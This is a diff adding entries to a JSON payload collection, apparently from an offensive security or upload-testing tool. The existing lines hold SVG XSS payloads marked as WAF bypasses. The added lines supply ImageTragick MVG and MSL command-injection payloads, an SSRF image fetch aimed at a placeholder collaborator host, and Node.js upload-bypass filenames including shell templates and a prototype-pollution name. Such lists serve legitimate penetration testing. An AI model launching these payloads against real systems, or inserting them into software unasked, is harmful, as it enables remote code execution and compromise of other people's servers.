@@ -60,6 +60,24 @@
         {"payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "description": "SVG animate element XSS — less commonly filtered", "waf_bypass": true},
         {"payload": "<svg><set onbegin=alert(1) attributename=x to=1>", "description": "SVG set element XSS — another uncommon event handler", "waf_bypass": true}
       ]
+    },
+    "imagemagick": {
+      "description": "ImageTragick/ImageMagick RCE via crafted image files (CVE-2016-3714 class)",
+      "payloads": [
+        {"payload": "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://COLLABORATOR_URL/im|id; )'\npop graphic-context", "description": "ImageTragick MVG RCE via fill url() directive", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><image><read filename=\"|id; \"/></image>", "description": "ImageMagick MSL command injection", "waf_bypass": false},
+        {"payload": "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'https://COLLABORATOR_URL/'\npop graphic-context", "description": "ImageTragick SSRF via image fetch", "waf_bypass": false}
+      ]
+    },
+    "nodejs_bypass": {
+      "description": "Node.js-specific file upload bypasses for Express/Multer applications",
+      "payloads": [
+        {"payload": "shell.js", "description": "Upload .js file — may execute if in require() path", "waf_bypass": false},
+        {"payload": "shell.ejs", "description": "Upload EJS template — template injection via file upload", "waf_bypass": false},
+        {"payload": "shell.hbs", "description": "Upload Handlebars template", "waf_bypass": false},
+        {"payload": "shell.pug", "description": "Upload Pug/Jade template", "waf_bypass": false},
+        {"payload": "__proto__.json", "description": "Prototype pollution via filename", "waf_bypass": true}
+      ]
     }
   }
 }
